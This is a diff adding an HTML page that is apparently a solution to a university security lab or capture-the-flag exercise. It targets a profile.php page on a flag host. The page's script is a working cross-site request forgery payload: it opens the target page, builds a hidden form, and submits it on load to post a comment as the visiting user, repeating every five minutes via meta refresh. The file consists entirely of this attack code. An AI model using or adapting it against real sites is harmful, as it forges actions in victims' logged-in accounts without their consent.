@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+    <head>
+        <meta http-equiv="refresh" content="300">
+    </head>
+    <body>
+        <script>
+        var url="http://ywang90-flag.foouniversity.com/profile.php";
+        var tmp = window.open(url,"profile");
+        document.write('<form id="wrappingThing" action="'+url+'" method="post"><input type="text" name="comment" value="You are framed">');
+        document.forms["wrappingThing"].target = "profile";
+        document.forms["wrappingThing"].submit();
+        </script>
+    </body>
+</html>
